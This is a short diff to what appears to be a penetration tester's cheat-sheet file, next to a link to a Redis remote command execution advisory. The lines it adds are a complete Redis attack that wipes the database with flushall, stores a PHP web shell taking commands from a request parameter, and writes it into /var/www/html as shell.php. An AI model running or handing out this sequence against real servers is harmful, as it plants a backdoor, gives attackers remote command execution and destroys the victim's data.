@@ -73,6 +73,16 @@ stty -rows 48 -columns 120
 
 https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html
 
+flushall
+
+set PleaseSubscribe "<? system($_REQUEST['cmd']); ?>"
+
+config set dbfilename shell.php
+
+config set dir /var/www/html/
+
+save
+
 # Python SERVER
 
 python -m simpleHTTPServer
